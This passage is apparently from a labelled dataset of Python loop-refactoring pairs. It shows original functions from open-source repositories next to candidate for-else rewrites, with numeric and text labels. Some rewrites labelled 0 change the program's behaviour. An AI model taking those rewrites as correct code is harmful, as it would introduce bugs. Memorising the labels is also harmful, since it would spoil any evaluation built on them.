    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
CLUEPretrainedModels,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/CLUEPretrainedModels/tokenization.py,https://github.com/CLUEbenchmark/CLUEPretrainedModels/tree/master//tokenization.py,WordpieceTokenizer,tokenize$308,"def tokenize(self, text):
    """"""Tokenizes a piece of text into its word pieces.

    This uses a greedy longest-match-first algorithm to perform tokenization
    using the given vocabulary.

    For example:
      input = ""unaffable""
      output = [""un"", ""##aff"", ""##able""]

    Args:
      text: A single token or whitespace separated tokens. This should have
        already been passed through `BasicTokenizer.

    Returns:
      A list of wordpiece tokens.
    """"""

    text = convert_to_unicode(text)

    output_tokens = []
    for token in whitespace_tokenize(text):
      chars = list(token)
      if len(chars) > self.max_input_chars_per_word:
        output_tokens.append(self.unk_token)
        continue

      is_bad = False
      start = 0
      sub_tokens = []
      while start < len(chars):
        end = len(chars)
        cur_substr = None
        while start < end:
          substr = """".join(chars[start:end])
          if start > 0:
            substr = ""##"" + substr
          if substr in self.vocab:
            cur_substr = substr
            break
          end -= 1
        if cur_substr is None:
          is_bad = True
          break
        sub_tokens.append(cur_substr)
        start = end

      if is_bad:
        output_tokens.append(self.unk_token)
      else:
        output_tokens.extend(sub_tokens)
    return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
rockstor-core,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/rockstor-core/src/rockstor/system/osi.py,https://github.com/rockstor/rockstor-core/tree/master/src/rockstor/system/osi.py,,inplace_replace$113,"def inplace_replace(of, nf, regex, nl):
    """"""
    Replaces or adds (if regex[i] not found) the line matchin regex[i] while
    otherwise copying the contents of of to nf
    :param of: Original File path - Usually of a system configuration file.
    :param nf: New File path - Usually of a secure temporary file setup by caller.
    :param regex: Regex tuple - by which we find the target lines.
    :param nl: New Line - tuple to replaced or be added to end of New File
    :return:
    """"""
    # N.B. this procedure is currently only used in system/nis.py
    with open(of) as afo, open(nf, ""w"") as tfo:
        replaced = [False] * len(regex)
        for l in afo.readlines():
            ireplace = False
            for i in range(0, len(regex)):
                if re.match(regex[i], l) is not None:
                    tfo.write(nl[i])
                    replaced[i] = True
                    ireplace = True
                    break
            if not ireplace:
                tfo.write(l)
        for i in range(0, len(replaced)):
            if not replaced[i]:
                tfo.write(nl[i])","for i in range(0, len(regex)):
    if re.match(regex[i], l) is not None:
        tfo.write(nl[i])
        replaced[i] = True
        ireplace = True
        break
if not ireplace:
    tfo.write(l)","for i in range(0, len(regex)):
    if re.match(regex[i], l) is not None:
        tfo.write(nl[i])
        replaced[i] = True
        break
else:
    tfo.write(l)","for i in range(0, len(regex)):
    if re.match(regex[i], l) is not None:
        tfo.write(nl[i])
        replaced[i] = True
        break
else:
    tfo.write(l)",1,"for i in range(0, len(regex)):
    if re.match(regex[i], l) is not None:
        tfo.write(nl[i])
        replaced[i] = True
        ireplace = True
        break
if not ireplace:
    tfo.write(l)","break statement is executed:None
break statement is not executed:zejun1"
NOFOUND
photon,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/photon/support/package-builder/PackageBuilder.py,https://github.com/vmware/photon/tree/master/support/package-builder/PackageBuilder.py,PackageBuilder,_installDependencies$81,"def _installDependencies(self, arch, deps=[]):
        listDependentPackages, listTestPackages, listInstalledPackages, listInstalledRPMs = (
            self._findDependentPackagesAndInstalledRPM(self.sandbox, arch))

        # PackageUtils should be initialized here - as per arch basis
        # Do not move it to __init__
        pkgUtils = PackageUtils(self.logName, self.logPath)

        if listDependentPackages:
            self.logger.debug(""Installing the build time dependent packages for "" + arch)
            for pkg in listDependentPackages:
                packageName, packageVersion = StringUtils.splitPackageNameAndVersion(pkg)
                self._installPackage(pkgUtils, packageName, packageVersion, self.sandbox, self.logPath,listInstalledPackages, listInstalledRPMs, arch)
            for pkg in listTestPackages:
                flag = False
                packageName, packageVersion = StringUtils.splitPackageNameAndVersion(pkg)
                for depPkg in listDependentPackages:
                    depPackageName, depPackageVersion = StringUtils.splitPackageNameAndVersion(depPkg)
                    if depPackageName == packageName:
                        flag = True
                        break;
                if flag == False:
                    self._installPackage(pkgUtils, packageName,packageVersion, self.sandbox, self.logPath,listInstalledPackages, listInstalledRPMs, arch)
            pkgUtils.installRPMSInOneShot(self.sandbox,arch)
            self.logger.debug(""Finished installing the build time dependent packages for "" + arch)","for depPkg in listDependentPackages:
    (depPackageName, depPackageVersion) = StringUtils.splitPackageNameAndVersion(depPkg)
    if depPackageName == packageName:
        flag = True
        break
if flag == False:
    self._installPackage(pkgUtils, packageName, packageVersion, self.sandbox, self.logPath, listInstalledPackages, listInstalledRPMs, arch)","for depPkg in listDependentPackages:
    (depPackageName, depPackageVersion) = StringUtils.splitPackageNameAndVersion(depPkg)
    if depPackageName == packageName:
        break
else:
    self._installPackage(pkgUtils, packageName, packageVersion, self.sandbox, self.logPath, listInstalledPackages, listInstalledRPMs, arch)",0
netzob,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/netzob/netzob/src/netzob/Export/WiresharkDissector/WiresharkDissector.py,https://github.com/netzob/netzob/tree/master/netzob/src/netzob/Export/WiresharkDissector/WiresharkDissector.py,WiresharkDissector,dissectSymbols$507,"def dissectSymbols(symbols, fname):
        """"""
        The user method for generating the LUA code representing the wireshark dissector for the passed symbols.
        The output is in file, named like the passed fname parameter, relative to the current working directory.
        :param symbols: List of Symbols
        :param fname: Sting with the name of the File
        :return: No return value
        """"""
        dissector = WiresharkDissector()
        text_based = True
        symbol_dissector = ''

        for sym in symbols:
            for leaf in sym.getLeafFields():
                if not isinstance(leaf.domain.dataType, ASCII):
                    text_based = False
                    break
            if text_based:
                #print('Text Dissector')
                symbol_dissector = symbol_dissector + dissector.__dessect_text(sym) + '\n\n\n'
            else:
                #print('Binary Dissector')
                symbol_dissector = symbol_dissector + dissector.__dessect_raw(sym) + '\n\n\n'

        # If there is more than one symbol a heuristic is needed to determ which symbol is used for the dissection

        if len(symbols) > 1:
            heur_dissector_name, heur_dissector = dissector.__writeHeuristicDissector(symbols)
            symbol_dissector = symbol_dissector + heur_dissector + '\n\n\n'
        else:
            ctx = dissector.__getMessageContext(symbols[0])
            heur_dissector_name = '{class_var}'.format(**ctx)
        # Register the heuristic dissector or if not existened the dissector for the only symbol
        symbol_dissector = symbol_dissector + dissector.__writeDissectorRegistration(symbols, heur_dissector_name) + '\n\n\n'

        with open(fname, 'w') as f:
            f.write(symbol_dissector)","for leaf in sym.getLeafFields():
    if not isinstance(leaf.domain.dataType, ASCII):
        text_based = False
        break
if text_based:
    symbol_dissector = symbol_dissector + dissector.__dessect_text(sym) + '\n\n\n'
else:
    symbol_dissector = symbol_dissector + dissector.__dessect_raw(sym) + '\n\n\n'","for leaf in sym.getLeafFields():
    if not isinstance(leaf.domain.dataType, ASCII):
        symbol_dissector = symbol_dissector + dissector.__dessect_raw(sym) + '\n\n\n'
        break
else:
    symbol_dissector = symbol_dissector + dissector.__dessect_text(sym) + '\n\n\n'",0
docker-systemctl-replacement,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/docker-systemctl-replacement/files/docker/systemctl.py,https://github.com/gdraheim/docker-systemctl-replacement/tree/master/files/docker/systemctl.py,Systemctl,do_kill_unit_from$3950,"def do_kill_unit_from(self, conf):
        started = time.time()
        doSendSIGKILL = self.get_SendSIGKILL(conf)
        doSendSIGHUP = self.get_SendSIGHUP(conf)
        useKillMode = self.get_KillMode(conf)
        useKillSignal = self.get_KillSignal(conf)
        kill_signal = getattr(signal, useKillSignal)
        timeout = self.get_TimeoutStopSec(conf)
        status_file = self.get_status_file_from(conf)
        size = os.path.exists(status_file) and os.path.getsize(status_file)
        logg.info(""STATUS %s %s"", status_file, size)
        mainpid = self.read_mainpid_from(conf)
        self.clean_status_from(conf) # clear RemainAfterExit and TimeoutStartSec
        if not mainpid:
            if useKillMode in [""control-group""]:
                logg.warning(""no main PID %s"", strQ(conf.filename()))
                logg.warning(""and there is no control-group here"")
            else:
                logg.info(""no main PID %s"", strQ(conf.filename()))
            return False
        if not pid_exists(mainpid) or pid_zombie(mainpid):
            logg.debug(""ignoring children when mainpid is already dead"")
            # because we list child processes, not processes in control-group
            return True
        pidlist = self.pidlist_of(mainpid) # here
        if pid_exists(mainpid):
            logg.info(""stop kill PID %s"", mainpid)
            self._kill_pid(mainpid, kill_signal)
        if useKillMode in [""control-group""]:
            if len(pidlist) > 1:
                logg.info(""stop control-group PIDs %s"", pidlist)
            for pid in pidlist:
                if pid != mainpid:
                    self._kill_pid(pid, kill_signal)
        if doSendSIGHUP: 
            logg.info(""stop SendSIGHUP to PIDs %s"", pidlist)
            for pid in pidlist:
                self._kill_pid(pid, signal.SIGHUP)
        # wait for the processes to have exited
        while True:
            dead = True
            for pid in pidlist:
                if pid_exists(pid) and not pid_zombie(pid):
                    dead = False
                    break
            if dead:
                break
            if time.time() > started + timeout:
                logg.info(""service PIDs not stopped after %s"", timeout)
                break
            time.sleep(1) # until TimeoutStopSec
        if dead or not doSendSIGKILL:
            logg.info(""done kill PID %s %s"", mainpid, dead and ""OK"")
            return dead
        if useKillMode in [ ""control-group"", ""mixed"" ]:
            logg.info(""hard kill PIDs %s"", pidlist)
            for pid in pidlist:
                if pid != mainpid:
                    self._kill_pid(pid, signal.SIGKILL)
            time.sleep(MinimumYield)
        # useKillMode in [ ""control-group"", ""mixed"", ""process"" ]
        if pid_exists(mainpid):
            logg.info(""hard kill PID %s"", mainpid)
            self._kill_pid(mainpid, signal.SIGKILL)
            time.sleep(MinimumYield)
        dead = not pid_exists(mainpid) or pid_zombie(mainpid)
        logg.info(""done hard kill PID %s %s"", mainpid, dead and ""OK"")
        return dead","for pid in pidlist:
    if pid_exists(pid) and (not pid_zombie(pid)):
        dead = False
        break
if dead:
    break","for pid in pidlist:
    if pid_exists(pid) and (not pid_zombie(pid)):
        break
else:
    break",0
pygmt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pygmt/pygmt/clib/loading.py,https://github.com/GenericMappingTools/pygmt/tree/master/pygmt/clib/loading.py,,load_libgmt$17,"def load_libgmt(lib_fullnames=None):
    """"""
    Find and load ``libgmt`` as a :py:class:`ctypes.CDLL`.

    Will look for the GMT shared library in the directories determined by
    clib_full_names().

    Parameters
    ----------
    lib_fullnames : list of str or None
        List of possible full names of GMT's shared library. If ``None``, will
        default to ``clib_full_names()``.

    Returns
    -------
    :py:class:`ctypes.CDLL` object
        The loaded shared library.

    Raises
    ------
    GMTCLibNotFoundError
        If there was any problem loading the library (couldn't find it or
        couldn't access the functions).
    """"""
    if lib_fullnames is None:
        lib_fullnames = clib_full_names()

    error = True
    error_msg = []
    failing_libs = []
    for libname in lib_fullnames:
        try:
            if libname not in failing_libs:  # skip the lib if it's known to fail
                libgmt = ctypes.CDLL(libname)
                check_libgmt(libgmt)
                error = False
                break
        except (OSError, GMTCLibError) as err:
            error_msg.append(f""Error loading GMT shared library at '{libname}'.\n{err}"")
            failing_libs.append(libname)

    if error:
        raise GMTCLibNotFoundError(""\n"".join(error_msg))

    return libgmt","for libname in lib_fullnames:
    try:
        if libname not in failing_libs:
            libgmt = ctypes.CDLL(libname)
            check_libgmt(libgmt)
            error = False
            break
    except (OSError, GMTCLibError) as err:
        error_msg.append(f""Error loading GMT shared library at '{libname}'.\n{err}"")
        failing_libs.append(libname)
if error:
    raise GMTCLibNotFoundError('\n'.join(error_msg))","for libname in lib_fullnames:
    try:
        if libname not in failing_libs:
            libgmt = ctypes.CDLL(libname)
            check_libgmt(libgmt)
            break
    except (OSError, GMTCLibError) as err:
        error_msg.append(f""Error loading GMT shared library at '{libname}'.\n{err}"")
        failing_libs.append(libname)
else:
    raise GMTCLibNotFoundError('\n'.join(error_msg))",0
PaddleGAN,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PaddleGAN/ppgan/apps/first_order_predictor.py,https://github.com/PaddlePaddle/PaddleGAN/tree/master/ppgan/apps/first_order_predictor.py,FirstOrderPredictor,extract_bbox$369,"def extract_bbox(self, image):
        detector = face_detection.FaceAlignment(
            face_detection.LandmarksType._2D,
            flip_input=False,
            face_detector=self.face_detector)

        frame = [image]
        predictions = detector.get_detections_for_image(np.array(frame))
        person_num = len(predictions)
        if person_num == 0:
            return np.array([])
        results = []
        face_boxs = []
        h, w, _ = image.shape
        for rect in predictions:
            bh = rect[3] - rect[1]
            bw = rect[2] - rect[0]
            cy = rect[1] + int(bh / 2)
            cx = rect[0] + int(bw / 2)
            margin = max(bh, bw)
            y1 = max(0, cy - margin)
            x1 = max(0, cx - int(0.8 * margin))
            y2 = min(h, cy + margin)
            x2 = min(w, cx + int(0.8 * margin))
            area = (y2 - y1) * (x2 - x1)
            results.append([x1, y1, x2, y2, area])
        # if a person has more than one bbox, keep the largest one
        # maybe greedy will be better?
        sorted(results, key=lambda area: area[4], reverse=True)
        results_box = [results[0]]
        for i in range(1, person_num):
            num = len(results_box)
            add_person = True
            for j in range(num):
                pre_person = results_box[j]
                iou = self.IOU(pre_person[0], pre_person[1], pre_person[2],
                               pre_person[3], pre_person[4], results[i][0],
                               results[i][1], results[i][2], results[i][3],
                               results[i][4])
                if iou > 0.5:
                    add_person = False
                    break
            if add_person:
                results_box.append(results[i])
        boxes = np.array(results_box)
        return boxes","for j in range(num):
    pre_person = results_box[j]
    iou = self.IOU(pre_person[0], pre_person[1], pre_person[2], pre_person[3], pre_person[4], results[i][0], results[i][1], results[i][2], results[i][3], results[i][4])
    if iou > 0.5:
        add_person = False
        break
if add_person:
    results_box.append(results[i])","for j in range(num):
    pre_person = results_box[j]
    iou = self.IOU(pre_person[0], pre_person[1], pre_person[2], pre_person[3], pre_person[4], results[i][0], results[i][1], results[i][2], results[i][3], results[i][4])
    if iou > 0.5:
        break
else:
    results_box.append(results[i])",0
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/tests/support/unit.py,https://github.com/saltstack/salt/tree/master/tests/support/unit.py,TestSuite,_handleModuleFixture$116,"def _handleModuleFixture(self, test, result):
        # We override _handleModuleFixture so that we can inspect all test classes in the module.
        # If all tests in a test class are going to be skipped, mark the class to skip.
        # This avoids running setUpClass and tearDownClass unnecessarily
        currentModule = test.__class__.__module__
        try:
            module = sys.modules[currentModule]
        except KeyError:
            return
        for attr in dir(module):
            klass = getattr(module, attr)
            if not inspect.isclass(klass):
                # Not even a class? Carry on...
                continue
            if klass.__module__ != currentModule:
                # This class is not defined in the module being tested? Carry on...
                continue
            if not issubclass(klass, TestCase):
                # This class is not a subclass of TestCase, carry on
                continue

            skip_klass = True
            test_functions = [name for name in dir(klass) if name.startswith(""test_"")]
            for name in test_functions:
                func = getattr(klass, name)
                if not isinstance(func, types.FunctionType):
                    # Not even a function, carry on
                    continue
                if getattr(func, ""__unittest_skip__"", False) is False:
                    # At least one test is not going to be skipped.
                    # Stop searching.
                    skip_klass = False
                    break
            if skip_klass is True:
                klass.__unittest_skip__ = True
        return super()._handleModuleFixture(test, result)","for name in test_functions:
    func = getattr(klass, name)
    if not isinstance(func, types.FunctionType):
        continue
    if getattr(func, '__unittest_skip__', False) is False:
        skip_klass = False
        break
if skip_klass is True:
    klass.__unittest_skip__ = True","for name in test_functions:
    func = getattr(klass, name)
    if not isinstance(func, types.FunctionType):
        continue
    if getattr(func, '__unittest_skip__', False) is False:
        break
else:
    klass.__unittest_skip__ = True",0
Jarvis,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Jarvis/jarviscli/plugins/morse_code.py,https://github.com/sukeesh/Jarvis/tree/master/jarviscli/plugins/morse_code.py,morsecode,decoder_input$139,"def decoder_input(self, jarvis, text):

        while True:
            correct = True
            check_input = jarvis.input(text)
            for letter in check_input:
                if not (letter in self.decoded_char):
                    correct = False
                    break
            if (correct):
                return check_input

            text = ""Not a valid unit. Try again: ""","for letter in check_input:
    if not letter in self.decoded_char:
        correct = False
        break
if correct:
    return check_input","for letter in check_input:
    if not letter in self.decoded_char:
        break
else:
    return check_input",0
keystone,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/keystone/keystone/api/auth.py,https://github.com/openstack/keystone/tree/master/keystone/api/auth.py,AuthFederationWebSSOResource,_perform_auth$339,"def _perform_auth(cls, protocol_id):
        idps = PROVIDERS.federation_api.list_idps()
        remote_id = None
        for idp in idps:
            try:
                remote_id_name = federation_utils.get_remote_id_parameter(
                    idp, protocol_id)
            except exception.FederatedProtocolNotFound:
                # no protocol for this IdP, so this can't be the IdP we're
                # looking for
                continue
            remote_id = flask.request.environ.get(remote_id_name)
            if remote_id:
                break
        if not remote_id:
            msg = 'Missing entity ID from environment'
            tr_msg = _('Missing entity ID from environment')
            LOG.error(msg)
            raise exception.Unauthorized(tr_msg)

        host = _get_sso_origin_host()
        ref = PROVIDERS.federation_api.get_idp_from_remote_id(remote_id)
        identity_provider = ref['idp_id']
        token = authentication.federated_authenticate_for_token(
            identity_provider=identity_provider, protocol_id=protocol_id)
        return cls._render_template_response(host, token.id)","for idp in idps:
    try:
        remote_id_name = federation_utils.get_remote_id_parameter(idp, protocol_id)
    except exception.FederatedProtocolNotFound:
        continue
    remote_id = flask.request.environ.get(remote_id_name)
    if remote_id:
        break
if not remote_id:
    msg = 'Missing entity ID from environment'
    tr_msg = _('Missing entity ID from environment')
    LOG.error(msg)
    raise exception.Unauthorized(tr_msg)","for idp in idps:
    try:
        remote_id_name = federation_utils.get_remote_id_parameter(idp, protocol_id)
    except exception.FederatedProtocolNotFound:
        continue
    remote_id = flask.request.environ.get(remote_id_name)
    if remote_id:
        break
else:
    msg = 'Missing entity ID from environment'
    tr_msg = _('Missing entity ID from environment')
    LOG.error(msg)
    raise exception.Unauthorized(tr_msg)",0
textrank,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/textrank/summa/preprocessing/snowball.py,https://github.com/summanlp/textrank/tree/master/summa/preprocessing/snowball.py,RussianStemmer,stem$2956,"def stem(self, word):
        """"""
        Stem a Russian word and return the stemmed form.

        :param word: The word that is stemmed.
        :type word: str or unicode
        :return: The stemmed form.
        :rtype: unicode

        """"""
        chr_exceeded = False
        for i in range(len(word)):
            if ord(word[i]) > 255:
                chr_exceeded = True
                break

        if chr_exceeded:
            word = self.__cyrillic_to_roman(word)

        step1_success = False
        adjectival_removed = False
        verb_removed = False
        undouble_success = False
        superlative_removed = False

        rv, r2 = self.__regions_russian(word)

        # Step 1
        for suffix in self.__perfective_gerund_suffixes:
            if rv.endswith(suffix):
                if suffix in (""v"", ""vshi"", ""vshis'""):
                    if (rv[-len(suffix)-3:-len(suffix)] == ""i^a"" or
                        rv[-len(suffix)-1:-len(suffix)] == ""a""):
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        step1_success = True
                        break
                else:
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    step1_success = True
                    break

        if not step1_success:
            for suffix in self.__reflexive_suffixes:
                if rv.endswith(suffix):
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    break

            for suffix in self.__adjectival_suffixes:
                if rv.endswith(suffix):
                    if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a',
                              'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u',
                              'i^ushchei^u', 'i^ushchimi', 'i^ushchymi',
                              'i^ushchego', 'i^ushchogo', 'i^ushchemu',
                              'i^ushchomu', 'i^ushchikh', 'i^ushchykh',
                              'shchi^ui^u', 'shchi^ai^a', 'i^ushchee',
                              'i^ushchie', 'i^ushchye', 'i^ushchoe',
                              'i^ushchei`', 'i^ushchii`', 'i^ushchyi`',
                              'i^ushchoi`', 'i^ushchem', 'i^ushchim',
                              'i^ushchym', 'i^ushchom', 'vshi^ui^u',
                              'vshi^ai^a', 'shchui^u', 'shchai^a',
                              'shchoi^u', 'shchei^u', 'emi^ui^u',
                              'emi^ai^a', 'nni^ui^u', 'nni^ai^a',
                              'shchimi', 'shchymi', 'shchego', 'shchogo',
                              'shchemu', 'shchomu', 'shchikh', 'shchykh',
                              'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u',
                              'shchee', 'shchie', 'shchye', 'shchoe',
                              'shchei`', 'shchii`', 'shchyi`', 'shchoi`',
                              'shchem', 'shchim', 'shchym', 'shchom',
                              'vshimi', 'vshymi', 'vshego', 'vshogo',
                              'vshemu', 'vshomu', 'vshikh', 'vshykh',
                              'emui^u', 'emai^a', 'emoi^u', 'emei^u',
                              'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u',
                              'vshee', 'vshie', 'vshye', 'vshoe',
                              'vshei`', 'vshii`', 'vshyi`', 'vshoi`',
                              'vshem', 'vshim', 'vshym', 'vshom',
                              'emimi', 'emymi', 'emego', 'emogo',
                              'ememu', 'emomu', 'emikh', 'emykh',
                              'nnimi', 'nnymi', 'nnego', 'nnogo',
                              'nnemu', 'nnomu', 'nnikh', 'nnykh',
                              'emee', 'emie', 'emye', 'emoe', 'emei`',
                              'emii`', 'emyi`', 'emoi`', 'emem', 'emim',
                              'emym', 'emom', 'nnee', 'nnie', 'nnye',
                              'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`',
                              'nnem', 'nnim', 'nnym', 'nnom'):
                        if (rv[-len(suffix)-3:-len(suffix)] == ""i^a"" or
                            rv[-len(suffix)-1:-len(suffix)] == ""a""):
                            word = word[:-len(suffix)]
                            r2 = r2[:-len(suffix)]
                            rv = rv[:-len(suffix)]
                            adjectival_removed = True
                            break
                    else:
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        adjectival_removed = True
                        break

            if not adjectival_removed:
                for suffix in self.__verb_suffixes:
                    if rv.endswith(suffix):
                        if suffix in (""la"", ""na"", ""ete"", ""i`te"", ""li"",
                                      ""i`"", ""l"", ""em"", ""n"", ""lo"", ""no"",
                                      ""et"", ""i^ut"", ""ny"", ""t'"", ""esh'"",
                                      ""nno""):
                            if (rv[-len(suffix)-3:-len(suffix)] == ""i^a"" or
                                rv[-len(suffix)-1:-len(suffix)] == ""a""):
                                word = word[:-len(suffix)]
                                r2 = r2[:-len(suffix)]
                                rv = rv[:-len(suffix)]
                                verb_removed = True
                                break
                        else:
                            word = word[:-len(suffix)]
                            r2 = r2[:-len(suffix)]
                            rv = rv[:-len(suffix)]
                            verb_removed = True
                            break

            if not adjectival_removed and not verb_removed:
                for suffix in self.__noun_suffixes:
                    if rv.endswith(suffix):
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        break

        # Step 2
        if rv.endswith(""i""):
            word = word[:-1]
            r2 = r2[:-1]

        # Step 3
        for suffix in self.__derivational_suffixes:
            if r2.endswith(suffix):
                word = word[:-len(suffix)]
                break

        # Step 4
        if word.endswith(""nn""):
            word = word[:-1]
            undouble_success = True

        if not undouble_success:
            for suffix in self.__superlative_suffixes:
                if word.endswith(suffix):
                    word = word[:-len(suffix)]
                    superlative_removed = True
                    break
            if word.endswith(""nn""):
                word = word[:-1]

        if not undouble_success and not superlative_removed:
            if word.endswith(""'""):
                word = word[:-1]

        if chr_exceeded:
            word = self.__roman_to_cyrillic(word)


        return word","for suffix in self.__perfective_gerund_suffixes:
    if rv.endswith(suffix):
        if suffix in ('v', 'vshi', ""vshis'""):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                step1_success = True
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            step1_success = True
            break
if not step1_success:
    for suffix in self.__reflexive_suffixes:
        if rv.endswith(suffix):
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            break
    for suffix in self.__adjectival_suffixes:
        if rv.endswith(suffix):
            if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    adjectival_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
    if not adjectival_removed:
        for suffix in self.__verb_suffixes:
            if rv.endswith(suffix):
                if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                    if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        verb_removed = True
                        break
                else:
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
    if not adjectival_removed and (not verb_removed):
        for suffix in self.__noun_suffixes:
            if rv.endswith(suffix):
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                break","for suffix in self.__perfective_gerund_suffixes:
    if rv.endswith(suffix):
        if suffix in ('v', 'vshi', ""vshis'""):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            break
else:
    for suffix in self.__reflexive_suffixes:
        if rv.endswith(suffix):
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            break
    for suffix in self.__adjectival_suffixes:
        if rv.endswith(suffix):
